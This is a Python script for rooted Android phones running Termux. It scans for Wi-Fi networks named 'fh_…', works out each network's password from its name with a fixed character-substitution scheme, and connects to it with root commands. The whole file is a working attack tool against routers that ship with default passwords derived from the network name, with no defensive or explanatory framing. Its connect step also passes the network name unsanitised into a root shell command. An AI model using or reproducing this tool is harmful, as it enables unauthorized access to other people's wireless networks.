import subprocess
import json
import sys

# ANSI Color Codes for beautiful output
RESET = "\033[0m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
BLUE = "\033[94m"

# Character substitution mapping based on your scheme
TRANS_MAP = {
    '6': '9', '9': '6',
    '7': '8', '8': '7',
    '0': 'f', 'f': '0',
    '1': 'e', 'e': '1',
    '2': 'd', 'd': '2',
    '5': 'a', 'a': '5',
    '4': 'b', 'b': '4',
    '3': 'c', 'c': '3'
}

def generate_password(ssid):
    if not ssid.startswith("fh_"):
        return None
    
    suffix = ssid[3:]
    transformed_suffix = "".join(TRANS_MAP.get(c, c) for c in suffix)
    return "wlan" + transformed_suffix

def scan_networks():
    try:
        result = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, check=True)
        return json.loads(result.stdout)
    except Exception as e:
        print(f"{RED}[-] Error scanning networks: {e}{RESET}")
        print(f"{YELLOW}[!] Make sure Termux:API app is installed and location permission is granted.{RESET}")
        return []

def connect_wifi(ssid, password):
    print(f"{CYAN}[*] Attempting to connect to '{ssid}' with password: {password}{RESET}")
    cmd = f"su -c 'cmd wifi connect-network \"{ssid}\" wpa2 \"{password}\"'"
    res = subprocess.run(cmd, shell=True)
    
    if res.returncode == 0:
        print(f"{GREEN}[+] Connection command executed successfully!{RESET}")
    else:
        print(f"{RED}[-] Failed to connect. Ensure your phone is rooted and root permission was granted.{RESET}")

def main():
    print(f"{CYAN}[*] Scanning for Wi-Fi networks starting with 'fh_'...{RESET}")
    networks = scan_networks()
    
    if not networks:
        print(f"{RED}[-] No networks found or scan returned empty.{RESET}")
        return

    found = False
    for net in networks:
        ssid = net.get("SSID", "") or net.get("ssid", "")
        if ssid.startswith("fh_"):
            found = True
            print(f"\n{GREEN}[+] Found target network: {BLUE}{ssid}{RESET}")
            password = generate_password(ssid)
            print(f"{GREEN}[+] Generated Password: {YELLOW}{password}{RESET}")
            
            choice = input(f"{YELLOW}Do you want to connect to {ssid}? (y/n): {RESET}").strip().lower()
            if choice == 'y':
                connect_wifi(ssid, password)
                break
                
    if not found:
        print(f"{YELLOW}[-] No networks starting with 'fh_' were found in current range.{RESET}")

if __name__ == "__main__":
    main()